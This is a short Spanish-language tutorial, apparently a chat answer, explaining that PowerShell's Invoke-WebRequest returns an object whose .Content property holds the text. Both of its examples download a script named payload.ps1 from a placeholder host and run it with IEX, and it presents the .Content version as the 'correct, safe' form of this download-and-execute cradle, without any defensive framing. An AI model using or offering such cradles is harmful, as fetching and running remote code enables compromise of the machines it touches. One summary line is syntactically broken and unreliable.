
##  Punto clave

**Invoke-WebRequest SIEMPRE devuelve un objeto.**
Dentro de ese objeto está el contenido.

---

##  Dos formas de usarlo

### Forma corta (a veces funciona):

```powershell
$texto = Invoke-WebRequest http://web/payload.ps1
IEX $texto
```

PowerShell, por comodidad, **intenta adivinar** que quieres el contenido.

---

### Forma correcta y explícita:

```powershell
$texto = (Invoke-WebRequest http://web/payload.ps1).Content
IEX $texto
```

Aquí tú le dices claramente:

 Dame SOLO el texto.

---

##  Por qué antes parecía que no hacía falta

Porque PowerShell es “listo” y **auto-convierte** el objeto a texto.
Pero esa conversión automática **no siempre funciona igual**.

Por eso:

 La forma segura es usar `.Content`.

---

```
Invoke-WebRequest = objeto
Invoke-WebRequest).Content = texto
```

---

##  Quédate con esto

* Antes no estaba “mal”.
* Ahora estás aprendiendo la **forma correcta**.
